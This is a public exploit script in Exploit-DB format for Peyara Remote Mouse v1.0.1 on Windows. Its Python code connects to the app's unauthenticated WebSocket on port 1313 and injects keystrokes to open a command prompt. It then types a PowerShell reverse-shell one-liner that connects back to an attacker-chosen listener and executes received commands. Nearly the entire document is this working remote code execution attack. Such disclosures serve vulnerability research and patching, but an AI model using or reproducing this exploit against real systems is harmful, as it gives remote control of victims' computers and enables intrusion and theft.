
# Exploit Title: Peyara Remote Mouse v1.0.1 - Remote Code Execution (RCE) 
# Date: 2025-05-30
# Exploit Author: tmrswrr
# Software Link: https://peyara-remote-mouse.vercel.app/
# Platform: Windows
# Version: v1.0.1
# Tested on: Windows 10

#usage : python3 Peyara.py --target 192.168.1.107 --lhost 192.168.1.110 --lport 4444

#!/usr/bin/env python3
import asyncio
import websockets
import json
import argparse

async def main(target, lhost, lport):
    uri = f"ws://{target}:1313/socket.io/?EIO=4&transport=websocket"
    async with websockets.connect(uri) as ws:

        open_frame = await ws.recv()
        print("[<] OPEN     ", open_frame)


        await ws.send("40")
        ns_ack = await ws.recv()
        print("[<] NAMESPACE", ns_ack)


        frame = await ws.recv()
        print("[<] FRAME    ", frame)
        if frame == "2":
            await ws.send("3")
            print("[>] PONG     3")

        await asyncio.sleep(1)


        ctrl_esc_event = '42["edit-key",{"key":"escape","modifier":["control"]}]'
        await ws.send(ctrl_esc_event)
        print("[>] Ctrl+Esc EVENT SENT:", ctrl_esc_event)
        await asyncio.sleep(0.5)  
        
        await ws.send('42["key","c"]')
        await asyncio.sleep(0.2)
        await ws.send('42["key","m"]')
        await asyncio.sleep(0.2)
        await ws.send('42["key","d"]')
        await asyncio.sleep(0.2)
        await ws.send('42["key","enter"]')
        await asyncio.sleep(1)
        
        await ws.send('42["key","enter"]')  
        await asyncio.sleep(0.5)
        

        ps_command = (
    f"powershell -nop -c \""
    f"$c=New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});"
    "$s=$c.GetStream();"
    "[byte[]]$b=0..65535|%{0};"
    "while(($i=$s.Read($b,0,$b.Length)) -ne 0){;"
    "$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);"
    "$r=iex $d 2>&1;"
    "$s.Write((New-Object -TypeName System.Text.ASCIIEncoding).GetBytes($r + 'PS > '),0,($r + 'PS > ').Length)"
    "}\""
)
        payload = '42' + json.dumps(["key", ps_command])
        await ws.send(payload)
        print("[>] PowerShell command sent")
        

        await asyncio.sleep(4)
        await ws.send('42["key","enter"]')
        await asyncio.sleep(0.5)
        
        while True:
            try:
                frame = await ws.recv()
                print("[<] FRAME    ", frame)
                
                if frame == "2":  
                    await ws.send("3")
                    print("[>] PONG     3")
                    
                if frame.startswith("341"):  
                    print("[*] Namespace connection was detected, exiting.")
                    break
                    
            except websockets.ConnectionClosed:
                print("[*] WebSocket connection closed")
                break

    print("[*]Complated.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='WebSocket Exploit Script')
    parser.add_argument('--target', required=True, help='Target server IP address')
    parser.add_argument('--lhost', required=True, help='Listener IP address')
    parser.add_argument('--lport', required=True, type=int, help='Listener port')
    
    args = parser.parse_args()
    
    asyncio.run(main(args.target, args.lhost, args.lport))
